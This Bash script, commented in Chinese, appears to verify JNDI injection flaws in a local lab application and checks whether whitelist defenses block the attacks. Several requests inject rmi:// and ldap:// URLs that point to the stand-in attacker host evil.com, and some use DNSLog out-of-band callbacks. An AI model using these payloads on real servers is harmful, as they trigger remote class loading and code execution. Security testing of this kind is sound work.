#!/bin/bash
# JNDI 注入漏洞验证脚本
# 漏洞类型: JNDI RMI/LDAP 远程代码加载
# 危险等级: 高危 (High)

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 配置
BASE_URL="http://localhost:8080"
DNSLOG_DOMAIN="xxx.dnslog.cn"  # 请替换为实际的 dnslog 子域名

# 测试计数
TOTAL=0
PASSED=0
FAILED=0

# 打印标题
print_header() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}JNDI 注入漏洞验证脚本${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""
}

# 测试函数
test_case() {
    local name="$1"
    local url="$2"
    local expected="$3"
    local description="$4"

    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "描述: $description"
    echo "URL: $url"

    response=$(curl -s -w "\n%{http_code}" "$url" 2>/dev/null)
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | sed '$d')

    if [ "$expected" = "vulnerable" ]; then
        # 漏洞场景: 应该包含特定的错误或响应
        if echo "$body" | grep -qiE "(lookup|NamingException|failed|timeout)" || [ "$http_code" != "200" ]; then
            echo -e "  ${GREEN}[✓] 存在漏洞${NC}"
            echo "  HTTP Code: $http_code"
            echo "  响应: $(echo "$body" | head -c 100)..."
            PASSED=$((PASSED + 1))
        else
            echo -e "  ${RED}[✗] 测试失败${NC}"
            echo "  HTTP Code: $http_code"
            FAILED=$((FAILED + 1))
        fi
    elif [ "$expected" = "safe" ]; then
        # 安全场景: 应该被拒绝
        if echo "$body" | grep -qiE "(denied|whitelist|not allowed)"; then
            echo -e "  ${GREEN}[✓] 防护有效${NC}"
            echo "  响应: $(echo "$body" | head -c 100)..."
            PASSED=$((PASSED + 1))
        else
            echo -e "  ${RED}[✗] 防护无效${NC}"
            echo "  HTTP Code: $http_code"
            FAILED=$((FAILED + 1))
        fi
    fi
}

# 开始测试
print_header

echo -e "${BLUE}=== 1. JNDI RMI 注入测试 ===${NC}"

test_case \
    "RMI 基础注入" \
    "${BASE_URL}/jndi/rmi/vuln?url=rmi://evil.com:1099/Exploit" \
    "vulnerable" \
    "通过 RMI 协议加载远程对象"

test_case \
    "RMI 配置加载" \
    "${BASE_URL}/jndi/rmi/config?config=rmi://evil.com:1099/Config" \
    "vulnerable" \
    "通过 RMI 加载远程配置"

test_case \
    "RMI 数据源" \
    "${BASE_URL}/jndi/rmi/datasource?name=rmi://evil.com:1099/MaliciousDS" \
    "vulnerable" \
    "通过 RMI 查找恶意数据源"

echo -e "\n${BLUE}=== 2. JNDI LDAP 注入测试 ===${NC}"

test_case \
    "LDAP 基础注入" \
    "${BASE_URL}/jndi/ldap/vuln?url=ldap://evil.com:1389/Exploit" \
    "vulnerable" \
    "通过 LDAP 协议加载远程对象"

test_case \
    "LDAP 认证绕过" \
    "${BASE_URL}/jndi/ldap/auth?userDN=ldap://evil.com:1389/EvilUser" \
    "vulnerable" \
    "通过 LDAP 进行恶意认证"

test_case \
    "LDAP 服务发现" \
    "${BASE_URL}/jndi/ldap/discover?service=ldap://evil.com:1389/EvilService" \
    "vulnerable" \
    "通过 LDAP 发现恶意服务"

echo -e "\n${BLUE}=== 3. DNS 外带检测 ===${NC}"

test_case \
    "RMI DNS 外带" \
    "${BASE_URL}/jndi/rmi/vuln?url=rmi://${DNSLOG_DOMAIN}:1099/Exploit" \
    "vulnerable" \
    "DNS 外带检测 (请检查 ${DNSLOG_DOMAIN})"

test_case \
    "LDAP DNS 外带" \
    "${BASE_URL}/jndi/ldap/vuln?url=ldap://${DNSLOG_DOMAIN}:1389/Exploit" \
    "vulnerable" \
    "DNS 外带检测 (请检查 ${DNSLOG_DOMAIN})"

echo -e "\n${BLUE}=== 4. 安全版本测试 ===${NC}"

test_case \
    "RMI 白名单防护" \
    "${BASE_URL}/jndi/rmi/safe?url=rmi://evil.com:1099/Exploit" \
    "safe" \
    "应该被白名单拒绝"

test_case \
    "RMI 安全通过" \
    "${BASE_URL}/jndi/rmi/safe?url=rmi://localhost:1099/ValidService" \
    "vulnerable" \
    "白名单内的请求应该通过"

test_case \
    "LDAP 协议防护" \
    "${BASE_URL}/jndi/ldap/safe?url=ldap://evil.com:1389/Exploit" \
    "safe" \
    "应该被防护策略拒绝"

echo -e "\n${BLUE}=== 5. 信息泄露检测 ===${NC}"

echo -e "\n${YELLOW}[*] 访问 JNDI 信息端点:${NC}"
info_url="${BASE_URL}/jndi/info"
curl -s "$info_url"
echo ""

# 打印总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}测试总结${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
echo -e "成功率: ${YELLOW}$(awk "BEGIN {printf \"%.1f\", ($PASSED/$TOTAL)*100}")%${NC}"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}所有测试通过！${NC}"
    exit 0
else
    echo -e "\n${RED}有 $FAILED 个测试失败${NC}"
    exit 1
fi
